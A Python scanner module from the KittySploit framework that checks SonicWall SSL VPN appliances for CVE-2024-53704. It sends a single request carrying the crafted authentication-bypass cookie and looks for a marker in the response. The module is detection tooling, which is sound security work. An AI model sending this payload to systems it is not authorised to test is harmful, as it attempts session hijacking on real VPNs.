#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An Improper Authentication vulnerability in the SSLVPN authentication mechanism allows a remote attacker to by."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SSL VPN Session Hijacking Detection',
        'description': 'An Improper Authentication vulnerability in the SSLVPN authentication mechanism allows a remote attacker to bypass authentication.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'sonicwall', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://bishopfox.com/blog/sonicwall-cve-2024-53704-ssl-vpn-session-hijacking',
            'https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2025-0003',
        ],
        'cve': 'CVE-2024-53704',
    }

    def run(self):
        path = '/cgi-bin/sslvpnclient?launchplatform='
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Cookie': 'swap=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=', 'Connection': 'close'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('NELaunchX1',)
        if any(m in body for m in body_any):
            self.set_info(severity='critical', reason='SSL VPN Session Hijacking detected', path=path)
            return True
        return False

